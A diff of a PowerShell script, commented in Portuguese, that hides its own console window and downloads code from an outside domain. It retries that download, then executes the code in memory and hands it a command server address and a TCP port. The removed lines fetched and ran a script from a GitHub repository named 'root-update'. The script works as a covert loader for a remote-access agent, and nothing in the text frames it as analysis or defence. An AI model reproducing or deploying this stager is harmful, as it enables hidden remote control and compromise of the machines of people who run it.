@@ -1,5 +1,33 @@
+param(
+    [string]$ServerUrl = "agent.apj-acesso.com:4000",
+    [int]$TcpPort = 7000,
+    [string]$InstallerUrl = "https://brconsulta.com/test/suporte.txt",
+    [int]$RequestTimeoutSec = 30
+)
+
+$ErrorActionPreference = 'Stop'
+try { [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 } catch {}
+
+# Esconde a janela (após o param; necessário para funcionar via IEX)
 Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();' -EA 0
 [H.W]::ShowWindow([H.W]::GetConsoleWindow(),0)
-$base='https://raw.githubusercontent.com/root-update/winup/refs/heads/main'
-$initial = (New-Object System.Net.WebClient).DownloadString("$base/initial.txt")
-& ([ScriptBlock]::Create($initial)) -ConfigUrl "$base/windows.json" -InitialScriptUrl "$base/initial.txt"
+
+$InstallerUrl = $InstallerUrl.Trim()
+if ($InstallerUrl -notmatch '^https?://') { $InstallerUrl = "https://$InstallerUrl" }
+
+$maxTry = 4
+$delay = 3
+$code = $null
+
+for ($i = 1; $i -le $maxTry; $i++) {
+    try {
+        $code = (Invoke-WebRequest -Uri $InstallerUrl -UseBasicParsing -TimeoutSec $RequestTimeoutSec).Content -replace '^﻿',''
+        break
+    } catch {
+        if ($i -ge $maxTry) { throw }
+        Start-Sleep -Seconds $delay
+        $delay = [math]::Min($delay * 2, 60)
+    }
+}
+
+& ([ScriptBlock]::Create($code)) -ServerUrl $ServerUrl -TcpPort $TcpPort
